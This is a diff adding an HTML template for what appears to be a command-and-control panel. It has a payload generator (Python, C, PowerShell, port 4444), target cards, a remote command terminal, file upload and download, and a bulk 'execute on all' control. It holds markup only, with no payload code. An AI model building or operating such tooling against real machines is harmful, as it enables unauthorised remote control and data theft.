@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
+    <title>Strategic Command Center - No Bullshit Design</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_real.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/strategic.css') }}">
+    <script nonce="{{ g.csp_nonce }}" src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script nonce="{{ g.csp_nonce }}" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <!-- STRATEGIC LAYOUT ARCHITECTURE -->
+    <div class="strategic-container">
+        
+        <!-- TOP BAR: ESSENTIAL INFO ONLY -->
+        <header class="top-bar">
+            <div class="top-bar-content">
+                <div class="system-stats">
+                    <a href="/" class="back-btn">← BACK TO DASHBOARD</a>
+                    <span id="targetCount">🎯 0 TARGETS</span>
+                    <span id="commandCount">⚡ 0 CMDS</span>
+                    <span id="fileCount">📁 0 FILES</span>
+                    <span id="refreshStatus">🔄 AUTO-REFRESH</span>
+                </div>
+                <div class="system-controls">
+                    <button id="refreshAllBtn" class="control-btn">🔄 REFRESH ALL</button>
+                    <button id="bulkOpsBtn" class="control-btn">⚡ BULK OPS</button>
+                    <button id="systemStatsBtn" class="control-btn">📊 STATS</button>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT AREA -->
+        <main class="main-content">
+            
+            <!-- CENTRAL TARGET GRID (80% of screen) -->
+            <section class="target-grid-section">
+                <div class="target-grid" id="targetGrid">
+                    <!-- Target cards will be dynamically generated here -->
+                    <!-- Each target is a complete control unit -->
+                </div>
+            </section>
+
+            <!-- RIGHT PANEL: CONTEXT-SENSITIVE (20% of screen) -->
+            <aside class="right-panel" id="rightPanel">
+                
+                <!-- Default: No target selected -->
+                <div class="panel-content" id="defaultPanel">
+                    <div class="panel-header">
+                        <h3>🎯 Strategic Overview</h3>
+                    </div>
+                    <div class="panel-body">
+                        <div class="payload-generator">
+                            <h4>🚀 Payload Generator</h4>
+                            <div class="payload-controls">
+                                <select id="payloadType">
+                                    <option value="python">Python Payload</option>
+                                    <option value="native">Native C Payload</option>
+                                    <option value="powershell">PowerShell Payload</option>
+                                </select>
+                                <input type="text" id="payloadHost" placeholder="Target Host" value="0.0.0.0">
+                                <input type="number" id="payloadPort" placeholder="Port" value="4444">
+                                <button id="generatePayloadBtn" class="action-btn">GENERATE</button>
+                            </div>
+                        </div>
+                        
+                        <div class="system-stats-panel">
+                            <h4>📊 System Statistics</h4>
+                            <div id="systemStatsDisplay">
+                                <div class="stat-item">
+                                    <span class="stat-label">Active Targets:</span>
+                                    <span class="stat-value" id="activeTargetsCount">0</span>
+                                </div>
+                                <div class="stat-item">
+                                    <span class="stat-label">Commands Executed:</span>
+                                    <span class="stat-value" id="commandsExecutedCount">0</span>
+                                </div>
+                                <div class="stat-item">
+                                    <span class="stat-label">File Operations:</span>
+                                    <span class="stat-value" id="fileOperationsCount">0</span>
+                                </div>
+                                <div class="stat-item">
+                                    <span class="stat-label">System CPU:</span>
+                                    <span class="stat-value" id="systemCpu">0%</span>
+                                </div>
+                                <div class="stat-item">
+                                    <span class="stat-label">System Memory:</span>
+                                    <span class="stat-value" id="systemMemory">0%</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Target selected: Command terminal + file browser -->
+                <div class="panel-content" id="targetPanel" style="display: none;">
+                    <div class="panel-header">
+                        <h3 id="selectedTargetName">Target Details</h3>
+                        <button id="closeTargetPanel" class="close-btn">×</button>
+                    </div>
+                    <div class="panel-body">
+                        
+                        <!-- Command Terminal -->
+                        <div class="command-terminal">
+                            <h4>⚡ Command Terminal</h4>
+                            <div class="terminal-output" id="terminalOutput">
+                                <div class="terminal-line">Ready for commands...</div>
+                            </div>
+                            <div class="terminal-input">
+                                <input type="text" id="commandInput" placeholder="Enter command...">
+                                <button id="executeCommandBtn">EXECUTE</button>
+                            </div>
+                        </div>
+
+                        <!-- File Browser -->
+                        <div class="file-browser">
+                            <h4>📁 File Browser</h4>
+                            <div class="file-controls">
+                                <input type="text" id="filePath" placeholder="/path/to/file" value="/">
+                                <button id="listFilesBtn">LIST</button>
+                                <button id="uploadFileBtn">UPLOAD</button>
+                                <button id="downloadFileBtn">DOWNLOAD</button>
+                            </div>
+                            <div class="file-list" id="fileList">
+                                <div class="file-item">No files loaded</div>
+                            </div>
+                        </div>
+
+                        <!-- Target Health -->
+                        <div class="target-health">
+                            <h4>💚 Target Health</h4>
+                            <div class="health-metrics">
+                                <div class="health-item">
+                                    <span class="health-label">Status:</span>
+                                    <span class="health-value" id="targetStatus">Unknown</span>
+                                </div>
+                                <div class="health-item">
+                                    <span class="health-label">CPU:</span>
+                                    <span class="health-value" id="targetCpu">0%</span>
+                                </div>
+                                <div class="health-item">
+                                    <span class="health-label">Memory:</span>
+                                    <span class="health-value" id="targetMemory">0%</span>
+                                </div>
+                                <div class="health-item">
+                                    <span class="health-label">Network:</span>
+                                    <span class="health-value" id="targetNetwork">0 MB/s</span>
+                                </div>
+                                <div class="health-item">
+                                    <span class="health-label">Health Score:</span>
+                                    <span class="health-value" id="targetHealthScore">0/100</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- Command running: Real-time output + progress -->
+                <div class="panel-content" id="commandPanel" style="display: none;">
+                    <div class="panel-header">
+                        <h3>⚡ Command Execution</h3>
+                        <button id="closeCommandPanel" class="close-btn">×</button>
+                    </div>
+                    <div class="panel-body">
+                        <div class="command-info">
+                            <div class="command-details">
+                                <span class="command-label">Command:</span>
+                                <span class="command-value" id="runningCommand">Unknown</span>
+                            </div>
+                            <div class="command-details">
+                                <span class="command-label">Target:</span>
+                                <span class="command-value" id="runningTarget">Unknown</span>
+                            </div>
+                            <div class="command-details">
+                                <span class="command-label">Status:</span>
+                                <span class="command-value" id="commandStatus">Running</span>
+                            </div>
+                        </div>
+                        
+                        <div class="command-output">
+                            <h4>Live Output</h4>
+                            <div class="output-content" id="commandOutput">
+                                <div class="output-line">Waiting for output...</div>
+                            </div>
+                        </div>
+                        
+                        <div class="command-progress">
+                            <div class="progress-bar">
+                                <div class="progress-fill" id="commandProgress"></div>
+                            </div>
+                            <span class="progress-text" id="progressText">0%</span>
+                        </div>
+                    </div>
+                </div>
+
+            </aside>
+
+        </main>
+
+    </div>
+
+    <!-- Bulk Operations Modal -->
+    <div class="modal" id="bulkOpsModal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>⚡ Bulk Operations</h3>
+                <button class="close-btn" onclick="closeBulkOpsModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <div class="bulk-selection">
+                    <h4>Select Targets</h4>
+                    <div class="target-checkboxes" id="bulkTargetCheckboxes">
+                        <!-- Target checkboxes will be generated here -->
+                    </div>
+                </div>
+                <div class="bulk-command">
+                    <h4>Command to Execute</h4>
+                    <input type="text" id="bulkCommand" placeholder="Enter command for all selected targets">
+                    <button id="executeBulkCommand" class="action-btn">EXECUTE ON ALL</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- System Stats Modal -->
+    <div class="modal" id="systemStatsModal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>📊 System Statistics</h3>
+                <button class="close-btn" onclick="closeSystemStatsModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <div id="detailedSystemStats">
+                    <!-- Detailed stats will be loaded here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script nonce="{{ g.csp_nonce }}" src="{{ url_for('static', filename='js/app_real.js') }}"></script>
+    <script nonce="{{ g.csp_nonce }}" src="{{ url_for('static', filename='js/strategic.js') }}"></script>
+</body>
+</html>
